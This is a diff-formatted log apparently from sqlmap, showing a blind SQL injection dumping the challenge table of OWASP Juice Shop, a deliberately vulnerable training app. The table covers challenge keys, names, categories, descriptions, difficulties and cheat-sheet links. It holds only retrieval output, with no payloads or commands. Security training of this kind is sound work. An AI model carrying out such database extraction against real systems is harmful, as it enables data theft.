+[11:56:00] [INFO] retrieved: 1
+
+[11:56:00] [INFO] retrieved: 6
+[11:56:00] [INFO] retrieving the length of query output
+
+[11:56:00] [INFO] retrieved: 33
+[11:56:00] [INFO] retrieved: _________________________________
+[11:56:00] [INFO] retrieved: 
+[11:56:04] [INFO] retrieved: resetPasswordBjoernOwaspChallenge             
+[11:56:04] [INFO] retrieved: resetPasswordBjoernOwaspChallenge
+[11:56:04] [INFO] retrieving the length of query output
+
+[11:56:04] [INFO] retrieved: 101
+[11:56:04] [INFO] retrieved: __________________________________
+[11:56:04] [INFO] retrieved: 
+[11:56:15] [INFO] retrieved: ..curity_Questions_Cheat_Sheet.html               
+[11:56:15] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Choosing_and_Using_Security_Questions_Cheat_Sheet.html
+[11:56:15] [INFO] retrieving the length of query output
+
+[11:56:15] [INFO] retrieved: 21
+[11:56:15] [INFO] retrieved: _____________________
+[11:56:15] [INFO] retrieved: 
+[11:56:17] [INFO] retrieved: Bjoern's Favorite Pet             
+[11:56:17] [INFO] retrieved: Bjoern's Favorite Pet
+[11:56:17] [INFO] retrieving the length of query output
+
+[11:56:17] [INFO] retrieved: 1
+
+[11:56:17] [INFO] retrieved: 0
+[11:56:17] [INFO] retrieving the length of query output
+
+[11:56:17] [INFO] retrieved: 27
+[11:56:18] [INFO] retrieved: ___________________________
+[11:56:18] [INFO] retrieved: 
+[11:56:20] [INFO] retrieved: OSINT,With Coding Challenge             
+[11:56:20] [INFO] retrieved: OSINT,With Coding Challenge
+[11:56:20] [INFO] retrieving the length of query output
+
+[11:56:20] [INFO] retrieved:  
+
+[11:56:20] [INFO] retrieved:  
+[11:56:21] [INFO] retrieving the length of query output
+
+[11:56:21] [INFO] retrieved: 30
+[11:56:21] [INFO] retrieved: ______________________________
+[11:56:21] [INFO] retrieved: 
+[11:56:24] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:56:24] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:56:24] [INFO] retrieving the length of query output
+
+[11:56:24] [INFO] retrieved: 26
+[11:56:24] [INFO] retrieved: __________________________
+[11:56:24] [INFO] retrieved: 
+[11:56:27] [INFO] retrieved: Security through Obscurity             
+[11:56:27] [INFO] retrieved: Security through Obscurity
+[11:56:27] [INFO] retrieving the length of query output
+
+[11:56:27] [INFO] retrieved: 1
+
+[11:56:27] [INFO] retrieved: 0
+[11:56:30] [INFO] retrieving the length of query output
+
+[11:56:30] [INFO] retrieved: 30
+[11:56:30] [INFO] retrieved: ______________________________
+[11:56:30] [INFO] retrieved: 
+[11:56:34] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:56:34] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:56:34] [INFO] retrieving the length of query output
+
+[11:56:34] [INFO] retrieved: 60
+[11:56:34] [INFO] retrieved: __________________________________
+[11:56:34] [INFO] retrieved: 
+[11:56:40] [INFO] retrieved: ..before its official announcement.             
+[11:56:40] [INFO] retrieved: Learn about the Token Sale before its official announcement.
+[11:56:40] [INFO] retrieving the length of query output
+
+[11:56:40] [INFO] retrieved: 1
+
+[11:56:40] [INFO] retrieved: 5
+[11:56:40] [INFO] retrieving the length of query output
+
+[11:56:40] [INFO] retrieved:  
+
+[11:56:40] [INFO] retrieved:  
+[11:56:40] [INFO] retrieving the length of query output
+
+[11:56:40] [INFO] retrieved: 1
+
+[11:56:40] [INFO] retrieved: 1
+[11:56:41] [INFO] retrieving the length of query output
+
+[11:56:41] [INFO] retrieved: 1
+
+[11:56:41] [INFO] retrieved: 7
+[11:56:41] [INFO] retrieving the length of query output
+
+[11:56:41] [INFO] retrieved: 18
+[11:56:41] [INFO] retrieved: __________________
+[11:56:41] [INFO] retrieved: 
+[11:56:43] [INFO] retrieved: tokenSaleChallenge             
+[11:56:43] [INFO] retrieved: tokenSaleChallenge
+[11:56:43] [INFO] retrieving the length of query output
+
+[11:56:43] [INFO] retrieved:  
+
+[11:56:43] [INFO] retrieved:  
+[11:56:43] [INFO] retrieving the length of query output
+
+[11:56:43] [INFO] retrieved: 15
+[11:56:43] [INFO] retrieved: _______________
+[11:56:43] [INFO] retrieved: 
+[11:56:45] [INFO] retrieved: Blockchain Hype             
+[11:56:45] [INFO] retrieved: Blockchain Hype
+[11:56:45] [INFO] retrieving the length of query output
+
+[11:56:45] [INFO] retrieved: 1
+
+[11:56:45] [INFO] retrieved: 0
+[11:56:45] [INFO] retrieving the length of query output
+
+[11:56:45] [INFO] retrieved: 52
+[11:56:46] [INFO] retrieved: __________________________________
+[11:56:46] [INFO] retrieved: 
+[11:56:51] [INFO] retrieved: ..alysis,Web3,With Coding Challenge             
+[11:56:51] [INFO] retrieved: Contraption,Code Analysis,Web3,With Coding Challenge
+[11:56:51] [INFO] retrieving the length of query output
+
+[11:56:51] [INFO] retrieved:  
+
+[11:56:51] [INFO] retrieved:  
+[11:56:51] [INFO] retrieving the length of query output
+
+[11:56:51] [INFO] retrieved: 30
+[11:56:51] [INFO] retrieved: ______________________________
+[11:56:51] [INFO] retrieved: 
+[11:56:55] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:56:55] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:56:55] [INFO] retrieving the length of query output
+
+[11:56:55] [INFO] retrieved: 23
+[11:56:55] [INFO] retrieved: _______________________
+[11:56:55] [INFO] retrieved: 
+[11:56:57] [INFO] retrieved: Sensitive Data Exposure             
+[11:56:57] [INFO] retrieved: Sensitive Data Exposure
+[11:56:57] [INFO] retrieving the length of query output
+
+[11:56:57] [INFO] retrieved: 1
+
+[11:56:57] [INFO] retrieved: 0
+[11:56:57] [INFO] retrieving the length of query output
+
+[11:56:57] [INFO] retrieved: 30
+[11:56:58] [INFO] retrieved: ______________________________
+[11:56:58] [INFO] retrieved: 
+[11:57:01] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:57:01] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:57:01] [INFO] retrieving the length of query output
+
+[11:57:01] [INFO] retrieved: 68
+[11:57:01] [INFO] retrieved: __________________________________
+[11:57:01] [INFO] retrieved: 
+[11:57:11] [INFO] retrieved: .. official Soul Bound Token (NFT).             
+[11:57:11] [INFO] retrieved: Take over the wallet containing our official Soul Bound Token (NFT).
+[11:57:11] [INFO] retrieving the length of query output
+
+[11:57:11] [INFO] retrieved: 1
+
+[11:57:11] [INFO] retrieved: 2
+[11:57:12] [INFO] retrieving the length of query output
+
+[11:57:12] [INFO] retrieved:  
+
+[11:57:12] [INFO] retrieved:  
+[11:57:12] [INFO] retrieving the length of query output
+
+[11:57:12] [INFO] retrieved: 1
+
+[11:57:12] [INFO] retrieved: 1
+[11:57:12] [INFO] retrieving the length of query output
+
+[11:57:12] [INFO] retrieved: 1
+
+[11:57:12] [INFO] retrieved: 8
+[11:57:12] [INFO] retrieving the length of query output
+
+[11:57:12] [INFO] retrieved: 18
+[11:57:12] [INFO] retrieved: __________________
+[11:57:12] [INFO] retrieved: 
+[11:57:15] [INFO] retrieved: nftUnlockChallenge             
+[11:57:15] [INFO] retrieved: nftUnlockChallenge
+[11:57:15] [INFO] retrieving the length of query output
+
+[11:57:15] [INFO] retrieved:  
+
+[11:57:15] [INFO] retrieved:  
+[11:57:15] [INFO] retrieving the length of query output
+
+[11:57:15] [INFO] retrieved: 12
+[11:57:15] [INFO] retrieved: ____________
+[11:57:15] [INFO] retrieved: 
+[11:57:17] [INFO] retrieved: NFT Takeover             
+[11:57:17] [INFO] retrieved: NFT Takeover
+[11:57:17] [INFO] retrieving the length of query output
+
+[11:57:17] [INFO] retrieved: 1
+
+[11:57:17] [INFO] retrieved: 0
+[11:57:17] [INFO] retrieving the length of query output
+
+[11:57:17] [INFO] retrieved: 53
+[11:57:17] [INFO] retrieved: __________________________________
+[11:57:17] [INFO] retrieved: 
+[11:57:23] [INFO] retrieved: .. Demos,Web3,With Coding Challenge             
+[11:57:23] [INFO] retrieved: Contraption,Good for Demos,Web3,With Coding Challenge
+[11:57:23] [INFO] retrieving the length of query output
+
+[11:57:23] [INFO] retrieved:  
+
+[11:57:23] [INFO] retrieved:  
+[11:57:23] [INFO] retrieving the length of query output
+
+[11:57:23] [INFO] retrieved: 30
+[11:57:23] [INFO] retrieved: ______________________________
+[11:57:23] [INFO] retrieved: 
+[11:57:26] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:57:26] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:57:26] [INFO] retrieving the length of query output
+
+[11:57:26] [INFO] retrieved: 25
+[11:57:27] [INFO] retrieved: _________________________
+[11:57:27] [INFO] retrieved: 
+[11:57:29] [INFO] retrieved: Improper Input Validation             
+[11:57:29] [INFO] retrieved: Improper Input Validation
+[11:57:29] [INFO] retrieving the length of query output
+
+[11:57:29] [INFO] retrieved: 1
+
+[11:57:29] [INFO] retrieved: 0
+[11:57:30] [INFO] retrieving the length of query output
+
+[11:57:30] [INFO] retrieved: 30
+[11:57:30] [INFO] retrieved: ______________________________
+[11:57:30] [INFO] retrieved: 
+[11:57:33] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:57:33] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:57:33] [INFO] retrieving the length of query output
+
+[11:57:33] [INFO] retrieved: 60
+[11:57:33] [INFO] retrieved: __________________________________
+[11:57:33] [INFO] retrieved: 
+[11:57:43] [INFO] retrieved: ..athering BEEs from the bee haven.             
+[11:57:43] [INFO] retrieved: Mint the Honey Pot NFT by gathering BEEs from the bee haven.
+[11:57:43] [INFO] retrieving the length of query output
+
+[11:57:43] [INFO] retrieved: 1
+
+[11:57:43] [INFO] retrieved: 3
+[11:57:43] [INFO] retrieving the length of query output
+
+[11:57:43] [INFO] retrieved:  
+
+[11:57:43] [INFO] retrieved:  
+[11:57:44] [INFO] retrieving the length of query output
+
+[11:57:44] [INFO] retrieved: 1
+
+[11:57:44] [INFO] retrieved: 1
+[11:57:44] [INFO] retrieving the length of query output
+
+[11:57:44] [INFO] retrieved: 1
+
+[11:57:44] [INFO] retrieved: 9
+[11:57:44] [INFO] retrieving the length of query output
+
+[11:57:44] [INFO] retrieved: 16
+[11:57:44] [INFO] retrieved: ________________
+[11:57:44] [INFO] retrieved: 
+[11:57:46] [INFO] retrieved: nftMintChallenge             
+[11:57:46] [INFO] retrieved: nftMintChallenge
+[11:57:46] [INFO] retrieving the length of query output
+
+[11:57:46] [INFO] retrieved:  
+
+[11:57:46] [INFO] retrieved:  
+[11:57:46] [INFO] retrieving the length of query output
+
+[11:57:46] [INFO] retrieved: 18
+[11:57:47] [INFO] retrieved: __________________
+[11:57:47] [INFO] retrieved: 
+[11:57:49] [INFO] retrieved: Mint the Honey Pot             
+[11:57:49] [INFO] retrieved: Mint the Honey Pot
+[11:57:49] [INFO] retrieving the length of query output
+
+[11:57:49] [INFO] retrieved: 1
+
+[11:57:49] [INFO] retrieved: 0
+[11:57:49] [INFO] retrieving the length of query output
+
+[11:57:49] [INFO] retrieved: 43
+[11:57:49] [INFO] retrieved: __________________________________
+[11:57:49] [INFO] retrieved: 
+[11:57:54] [INFO] retrieved: ..net Traffic,With Coding Challenge             
+[11:57:54] [INFO] retrieved: Web3,Internet Traffic,With Coding Challenge
+[11:57:54] [INFO] retrieving the length of query output
+
+[11:57:54] [INFO] retrieved:  
+
+[11:57:54] [INFO] retrieved:  
+[11:57:54] [INFO] retrieving the length of query output
+
+[11:57:54] [INFO] retrieved: 30
+[11:57:55] [INFO] retrieved: ______________________________
+[11:57:55] [INFO] retrieved: 
+[11:57:58] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:57:58] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:57:58] [INFO] retrieving the length of query output
+
+[11:57:58] [INFO] retrieved: 13
+[11:57:58] [INFO] retrieved: _____________
+[11:57:58] [INFO] retrieved: 
+[11:58:00] [INFO] retrieved: Miscellaneous             
+[11:58:00] [INFO] retrieved: Miscellaneous
+[11:58:00] [INFO] retrieving the length of query output
+
+[11:58:00] [INFO] retrieved: 1
+
+[11:58:00] [INFO] retrieved: 0
+[11:58:00] [INFO] retrieving the length of query output
+
+[11:58:00] [INFO] retrieved: 30
+[11:58:00] [INFO] retrieved: ______________________________
+[11:58:00] [INFO] retrieved: 
+[11:58:03] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:58:03] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:58:03] [INFO] retrieving the length of query output
+
+[11:58:03] [INFO] retrieved: 57
+[11:58:04] [INFO] retrieved: __________________________________
+[11:58:04] [INFO] retrieved: 
+[11:58:10] [INFO] retrieved: ..he new wallet than you deposited.             
+[11:58:10] [INFO] retrieved: Withdraw more ETH from the new wallet than you deposited.
+[11:58:10] [INFO] retrieving the length of query output
+
+[11:58:10] [INFO] retrieved: 1
+
+[11:58:10] [INFO] retrieved: 6
+[11:58:10] [INFO] retrieving the length of query output
+
+[11:58:10] [INFO] retrieved:  
+
+[11:58:10] [INFO] retrieved:  
+[11:58:10] [INFO] retrieving the length of query output
+
+[11:58:10] [INFO] retrieved: 1
+
+[11:58:10] [INFO] retrieved: 1
+[11:58:10] [INFO] retrieving the length of query output
+
+[11:58:10] [INFO] retrieved: 2
+[11:58:10] [INFO] retrieved: __
+[11:58:10] [INFO] retrieved: 
+[11:58:11] [INFO] retrieved: 10           
+[11:58:11] [INFO] retrieved: 10
+[11:58:11] [INFO] retrieving the length of query output
+
+[11:58:11] [INFO] retrieved: 19
+[11:58:11] [INFO] retrieved: ___________________
+[11:58:11] [INFO] retrieved: 
+[11:58:17] [INFO] retrieved: web3WalletChallenge             
+[11:58:17] [INFO] retrieved: web3WalletChallenge
+[11:58:17] [INFO] retrieving the length of query output
+
+[11:58:17] [INFO] retrieved:  
+
+[11:58:17] [INFO] retrieved:  
+[11:58:17] [INFO] retrieving the length of query output
+
+[11:58:17] [INFO] retrieved: 16
+[11:58:17] [INFO] retrieved: ________________
+[11:58:17] [INFO] retrieved: 
+[11:58:19] [INFO] retrieved: Wallet Depletion             
+[11:58:19] [INFO] retrieved: Wallet Depletion
+[11:58:19] [INFO] retrieving the length of query output
+
+[11:58:19] [INFO] retrieved: 1
+
+[11:58:19] [INFO] retrieved: 0
+[11:58:19] [INFO] retrieving the length of query output
+
+[11:58:19] [INFO] retrieved: 43
+[11:58:19] [INFO] retrieved: __________________________________
+[11:58:19] [INFO] retrieved: 
+[11:58:24] [INFO] retrieved: ..net Traffic,With Coding Challenge             
+[11:58:24] [INFO] retrieved: Web3,Internet Traffic,With Coding Challenge
+[11:58:24] [INFO] retrieving the length of query output
+
+[11:58:24] [INFO] retrieved:  
+
+[11:58:24] [INFO] retrieved:  
+[11:58:24] [INFO] retrieving the length of query output
+
+[11:58:24] [INFO] retrieved: 30
+[11:58:24] [INFO] retrieved: ______________________________
+[11:58:24] [INFO] retrieved: 
+[11:58:27] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:58:27] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:58:27] [INFO] retrieving the length of query output
+
+[11:58:27] [INFO] retrieved: 21
+[11:58:28] [INFO] retrieved: _____________________
+[11:58:28] [INFO] retrieved: 
+[11:58:30] [INFO] retrieved: Broken Access Control             
+[11:58:30] [INFO] retrieved: Broken Access Control
+[11:58:30] [INFO] retrieving the length of query output
+
+[11:58:30] [INFO] retrieved: 1
+
+[11:58:30] [INFO] retrieved: 0
+[11:58:30] [INFO] retrieving the length of query output
+
+[11:58:30] [INFO] retrieved: 30
+[11:58:30] [INFO] retrieved: ______________________________
+[11:58:30] [INFO] retrieved: 
+[11:58:33] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:58:34] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:58:34] [INFO] retrieving the length of query output
+
+[11:58:34] [INFO] retrieved: 82
+[11:58:34] [INFO] retrieved: __________________________________
+[11:58:34] [INFO] retrieved: 
+[11:58:42] [INFO] retrieved: ..iting smart contracts on the fly.             
+[11:58:42] [INFO] retrieved: Find an accidentally deployed code sandbox for writing smart contracts on the fly.
+[11:58:42] [INFO] retrieving the length of query output
+
+[11:58:42] [INFO] retrieved: 1
+
+[11:58:42] [INFO] retrieved: 1
+[11:58:42] [INFO] retrieving the length of query output
+
+[11:58:42] [INFO] retrieved:  
+
+[11:58:42] [INFO] retrieved:  
+[11:58:43] [INFO] retrieving the length of query output
+
+[11:58:43] [INFO] retrieved: 1
+
+[11:58:43] [INFO] retrieved: 1
+[11:58:43] [INFO] retrieving the length of query output
+
+[11:58:43] [INFO] retrieved: 2
+[11:58:43] [INFO] retrieved: __
+[11:58:43] [INFO] retrieved: 
+[11:58:43] [INFO] retrieved: 11           
+[11:58:43] [INFO] retrieved: 11
+[11:58:43] [INFO] retrieving the length of query output
+
+[11:58:43] [INFO] retrieved: 20
+[11:58:43] [INFO] retrieved: ____________________
+[11:58:43] [INFO] retrieved: 
+[11:58:46] [INFO] retrieved: web3SandboxChallenge             
+[11:58:46] [INFO] retrieved: web3SandboxChallenge
+[11:58:46] [INFO] retrieving the length of query output
+
+[11:58:46] [INFO] retrieved:  
+
+[11:58:46] [INFO] retrieved:  
+[11:58:46] [INFO] retrieving the length of query output
+
+[11:58:46] [INFO] retrieved: 12
+[11:58:46] [INFO] retrieved: ____________
+[11:58:46] [INFO] retrieved: 
+[11:58:48] [INFO] retrieved: Web3 Sandbox             
+[11:58:48] [INFO] retrieved: Web3 Sandbox
+[11:58:48] [INFO] retrieving the length of query output
+
+[11:58:48] [INFO] retrieved: 1
+
+[11:58:48] [INFO] retrieved: 0
+[11:58:51] [INFO] retrieving the length of query output
+
+[11:58:51] [INFO] retrieved: 26
+[11:58:51] [INFO] retrieved: __________________________
+[11:58:51] [INFO] retrieved: 
+[11:58:54] [INFO] retrieved: Web3,With Coding Challenge             
+[11:58:54] [INFO] retrieved: Web3,With Coding Challenge
+[11:58:54] [INFO] retrieving the length of query output
+
+[11:58:54] [INFO] retrieved:  
+
+[11:58:54] [INFO] retrieved:  
+[11:58:54] [INFO] retrieving the length of query output
+
+[11:58:54] [INFO] retrieved: 30
+[11:58:54] [INFO] retrieved: ______________________________
+[11:58:54] [INFO] retrieved: 
+[11:58:57] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:58:57] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:58:57] [INFO] retrieving the length of query output
+
+[11:58:57] [INFO] retrieved: 24
+[11:58:58] [INFO] retrieved: ________________________
+[11:58:58] [INFO] retrieved: 
+[11:59:00] [INFO] retrieved: Insecure Deserialization             
+[11:59:00] [INFO] retrieved: Insecure Deserialization
+[11:59:00] [INFO] retrieving the length of query output
+
+[11:59:00] [INFO] retrieved: 1
+
+[11:59:00] [INFO] retrieved: 0
+[11:59:00] [INFO] retrieving the length of query output
+
+[11:59:00] [INFO] retrieved: 30
+[11:59:00] [INFO] retrieved: ______________________________
+[11:59:00] [INFO] retrieved: 
+[11:59:04] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:59:04] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:59:04] [INFO] retrieving the length of query output
+
+[11:59:04] [INFO] retrieved: 175
+[11:59:04] [INFO] retrieved: __________________________________
+[11:59:04] [INFO] retrieved: 
+[11:59:23] [INFO] retrieved: ..harmful</strong> on Docker!)</em>               
+[11:59:23] [INFO] retrieved: Perform a Remote Code Execution that would keep a less hardened application busy <em>forever</em>. <em>(This challenge is <strong>potentially harmful</strong> on Docker!)</em>
+[11:59:23] [INFO] retrieving the length of query output
+
+[11:59:23] [INFO] retrieved: 1
+
+[11:59:23] [INFO] retrieved: 5
+[11:59:23] [INFO] retrieving the length of query output
+
+[11:59:23] [INFO] retrieved: 6
+[11:59:26] [INFO] retrieved: ______
+[11:59:26] [INFO] retrieved: 
+[11:59:27] [INFO] retrieved: Docker           
+[11:59:27] [INFO] retrieved: Docker
+[11:59:27] [INFO] retrieving the length of query output
+
+[11:59:27] [INFO] retrieved: 1
+
+[11:59:27] [INFO] retrieved: 0
+[11:59:27] [INFO] retrieving the length of query output
+
+[11:59:27] [INFO] retrieved: 2
+[11:59:27] [INFO] retrieved: __
+[11:59:27] [INFO] retrieved: 
+[11:59:27] [INFO] retrieved: 12           
+[11:59:27] [INFO] retrieved: 12
+[11:59:27] [INFO] retrieving the length of query output
+
+[11:59:27] [INFO] retrieved: 12
+[11:59:28] [INFO] retrieved: ____________
+[11:59:28] [INFO] retrieved: 
+[11:59:29] [INFO] retrieved: rceChallenge             
+[11:59:29] [INFO] retrieved: rceChallenge
+[11:59:29] [INFO] retrieving the length of query output
+
+[11:59:29] [INFO] retrieved: 81
+[11:59:29] [INFO] retrieved: __________________________________
+[11:59:29] [INFO] retrieved: 
+[11:59:37] [INFO] retrieved: ..enial_of_Service_Cheat_Sheet.html             
+[11:59:37] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html
+[11:59:37] [INFO] retrieving the length of query output
+
+[11:59:37] [INFO] retrieved: 15
+[11:59:37] [INFO] retrieved: _______________
+[11:59:37] [INFO] retrieved: 
+[11:59:39] [INFO] retrieved: Blocked RCE DoS             
+[11:59:39] [INFO] retrieved: Blocked RCE DoS
+[11:59:39] [INFO] retrieving the length of query output
+
+[11:59:39] [INFO] retrieved: 1
+
+[11:59:39] [INFO] retrieved: 0
+[11:59:39] [INFO] retrieving the length of query output
+
+[11:59:39] [INFO] retrieved: 11
+[11:59:39] [INFO] retrieved: ___________
+[11:59:39] [INFO] retrieved: 
+[11:59:41] [INFO] retrieved: Danger Zone             
+[11:59:41] [INFO] retrieved: Danger Zone
+[11:59:41] [INFO] retrieving the length of query output
+
+[11:59:41] [INFO] retrieved:  
+
+[11:59:41] [INFO] retrieved:  
+[11:59:41] [INFO] retrieving the length of query output
+
+[11:59:41] [INFO] retrieved: 30
+[11:59:41] [INFO] retrieved: ______________________________
+[11:59:41] [INFO] retrieved: 
+[11:59:45] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:59:45] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:59:45] [INFO] retrieving the length of query output
+
+[11:59:45] [INFO] retrieved: 22
+[11:59:45] [INFO] retrieved: ______________________
+[11:59:45] [INFO] retrieved: 
+[11:59:47] [INFO] retrieved: Broken Anti Automation             
+[11:59:47] [INFO] retrieved: Broken Anti Automation
+[11:59:47] [INFO] retrieving the length of query output
+
+[11:59:47] [INFO] retrieved: 1
+
+[11:59:47] [INFO] retrieved: 0
+[11:59:48] [INFO] retrieving the length of query output
+
+[11:59:48] [INFO] retrieved: 30
+[11:59:48] [INFO] retrieved: ______________________________
+[11:59:48] [INFO] retrieved: 
+[11:59:51] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[11:59:51] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[11:59:51] [INFO] retrieving the length of query output
+
+[11:59:51] [INFO] retrieved: 55
+[11:59:51] [INFO] retrieved: __________________________________
+[11:59:51] [INFO] retrieved: 
+[11:59:57] [INFO] retrieved: ..omer feedbacks within 20 seconds.             
+[11:59:57] [INFO] retrieved: Submit 10 or more customer feedbacks within 20 seconds.
+[11:59:57] [INFO] retrieving the length of query output
+
+[11:59:57] [INFO] retrieved: 1
+
+[11:59:57] [INFO] retrieved: 3
+[11:59:57] [INFO] retrieving the length of query output
+
+[11:59:57] [INFO] retrieved:  
+
+[11:59:57] [INFO] retrieved:  
+[11:59:57] [INFO] retrieving the length of query output
+
+[11:59:57] [INFO] retrieved: 1
+
+[11:59:57] [INFO] retrieved: 0
+[11:59:58] [INFO] retrieving the length of query output
+
+[11:59:58] [INFO] retrieved: 2
+[11:59:58] [INFO] retrieved: __
+[11:59:58] [INFO] retrieved: 
+[11:59:58] [INFO] retrieved: 13           
+[11:59:58] [INFO] retrieved: 13
+[11:59:58] [INFO] retrieving the length of query output
+
+[11:59:58] [INFO] retrieved: 22
+[11:59:58] [INFO] retrieved: ______________________
+[11:59:58] [INFO] retrieved: 
+[12:00:01] [INFO] retrieved: captchaBypassChallenge             
+[12:00:01] [INFO] retrieved: captchaBypassChallenge
+[12:00:01] [INFO] retrieving the length of query output
+
+[12:00:01] [INFO] retrieved:  
+
+[12:00:01] [INFO] retrieved:  
+[12:00:01] [INFO] retrieving the length of query output
+
+[12:00:01] [INFO] retrieved: 14
+[12:00:01] [INFO] retrieved: ______________
+[12:00:01] [INFO] retrieved: 
+[12:00:03] [INFO] retrieved: CAPTCHA Bypass             
+[12:00:03] [INFO] retrieved: CAPTCHA Bypass
+[12:00:03] [INFO] retrieving the length of query output
+
+[12:00:03] [INFO] retrieved: 1
+
+[12:00:03] [INFO] retrieved: 0
+[12:00:03] [INFO] retrieving the length of query output
+
+[12:00:03] [INFO] retrieved: 11
+[12:00:03] [INFO] retrieved: ___________
+[12:00:03] [INFO] retrieved: 
+[12:00:04] [INFO] retrieved: Brute Force             
+[12:00:04] [INFO] retrieved: Brute Force
+[12:00:04] [INFO] retrieving the length of query output
+
+[12:00:04] [INFO] retrieved:  
+
+[12:00:04] [INFO] retrieved:  
+[12:00:04] [INFO] retrieving the length of query output
+
+[12:00:04] [INFO] retrieved: 30
+[12:00:05] [INFO] retrieved: ______________________________
+[12:00:05] [INFO] retrieved: 
+[12:00:08] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:00:08] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:00:08] [INFO] retrieving the length of query output
+
+[12:00:08] [INFO] retrieved: 21
+[12:00:08] [INFO] retrieved: _____________________
+[12:00:08] [INFO] retrieved: 
+[12:00:11] [INFO] retrieved: Broken Authentication             
+[12:00:11] [INFO] retrieved: Broken Authentication
+[12:00:11] [INFO] retrieving the length of query output
+
+[12:00:11] [INFO] retrieved: 1
+
+[12:00:11] [INFO] retrieved: 0
+[12:00:11] [INFO] retrieving the length of query output
+
+[12:00:11] [INFO] retrieved: 30
+[12:00:11] [INFO] retrieved: ______________________________
+[12:00:11] [INFO] retrieved: 
+[12:00:19] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:00:19] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:00:19] [INFO] retrieving the length of query output
+
+[12:00:19] [INFO] retrieved: 97
+[12:00:19] [INFO] retrieved: __________________________________
+[12:00:19] [INFO] retrieved: 
+[12:00:29] [INFO] retrieved: ..SQL Injection or Forgot Password.             
+[12:00:29] [INFO] retrieved: Change Bender's password into <i>slurmCl4ssic</i> without using SQL Injection or Forgot Password.
+[12:00:29] [INFO] retrieving the length of query output
+
+[12:00:29] [INFO] retrieved: 1
+
+[12:00:29] [INFO] retrieved: 5
+[12:00:30] [INFO] retrieving the length of query output
+
+[12:00:30] [INFO] retrieved:  
+
+[12:00:30] [INFO] retrieved:  
+[12:00:30] [INFO] retrieving the length of query output
+
+[12:00:30] [INFO] retrieved: 1
+
+[12:00:30] [INFO] retrieved: 0
+[12:00:30] [INFO] retrieving the length of query output
+
+[12:00:30] [INFO] retrieved: 2
+[12:00:30] [INFO] retrieved: __
+[12:00:30] [INFO] retrieved: 
+[12:00:30] [INFO] retrieved: 14           
+[12:00:30] [INFO] retrieved: 14
+[12:00:31] [INFO] retrieving the length of query output
+
+[12:00:30] [INFO] retrieved: 29
+[12:00:31] [INFO] retrieved: _____________________________
+[12:00:31] [INFO] retrieved: 
+[12:00:34] [INFO] retrieved: changePasswordBenderChallenge             
+[12:00:34] [INFO] retrieved: changePasswordBenderChallenge
+[12:00:34] [INFO] retrieving the length of query output
+
+[12:00:34] [INFO] retrieved: 78
+[12:00:34] [INFO] retrieved: __________________________________
+[12:00:34] [INFO] retrieved: 
+[12:00:42] [INFO] retrieved: ..s/Authentication_Cheat_Sheet.html             
+[12:00:42] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
+[12:00:42] [INFO] retrieving the length of query output
+
+[12:00:42] [INFO] retrieved: 24
+[12:00:42] [INFO] retrieved: ________________________
+[12:00:42] [INFO] retrieved: 
+[12:00:44] [INFO] retrieved: Change Bender's Password             
+[12:00:44] [INFO] retrieved: Change Bender's Password
+[12:00:44] [INFO] retrieving the length of query output
+
+[12:00:44] [INFO] retrieved: 1
+
+[12:00:45] [INFO] retrieved: 0
+[12:00:45] [INFO] retrieving the length of query output
+
+[12:00:45] [INFO] retrieved:  
+
+[12:00:45] [INFO] retrieved:  
+[12:00:45] [INFO] retrieving the length of query output
+
+[12:00:45] [INFO] retrieved:  
+
+[12:00:45] [INFO] retrieved:  
+[12:00:45] [INFO] retrieving the length of query output
+
+[12:00:45] [INFO] retrieved: 30
+[12:00:45] [INFO] retrieved: ______________________________
+[12:00:45] [INFO] retrieved: 
+[12:00:49] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:00:49] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:00:49] [INFO] retrieving the length of query output
+
+[12:00:49] [INFO] retrieved: 9
+[12:00:49] [INFO] retrieved: _________
+[12:00:49] [INFO] retrieved: 
+[12:00:50] [INFO] retrieved: Injection           
+[12:00:50] [INFO] retrieved: Injection
+[12:00:50] [INFO] retrieving the length of query output
+
+[12:00:50] [INFO] retrieved: 1
+
+[12:00:53] [INFO] retrieved: 0
+[12:00:53] [INFO] retrieving the length of query output
+
